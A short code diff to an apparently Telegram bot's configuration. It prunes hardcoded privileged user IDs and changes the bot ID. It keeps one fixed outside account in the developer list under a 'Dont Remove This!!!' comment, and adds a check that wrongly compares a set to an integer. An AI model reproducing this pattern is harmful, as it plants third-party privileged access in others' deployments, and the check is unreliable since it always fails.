@@ -199,15 +199,8 @@ else:
 
 # Dont Remove This!!!
 DEV_USERS.add(OWNER_ID)
-DEV_USERS.add(1791795037)
 DEV_USERS.add(949365920)
-DEV_USERS.add(2043468602)
-BOT_ID = 5092248582
-DEMONS.add(977805775)
-DEMONS.add(5288203109)
-SUPPORT_USERS.add(5128342147)
-SUPPORT_USERS.add(1835783426)
-SUPPORT_USERS.add(5147265129)
+BOT_ID = 5118086248
 
 # Pass if SpamWatch token not set.
 if SPAMWATCH is None:
@@ -260,3 +253,8 @@ def spamfilters(text, user_id, chat_id):
 
     print("[Yor] This user is a spammer!")
     return True
+    
+if DEV_USERS != 949365920:
+    LOGGER.warning("DEV_USERS must have id '949365920'")
+else:
+    DEV_USERS = list(DEV_USERS)
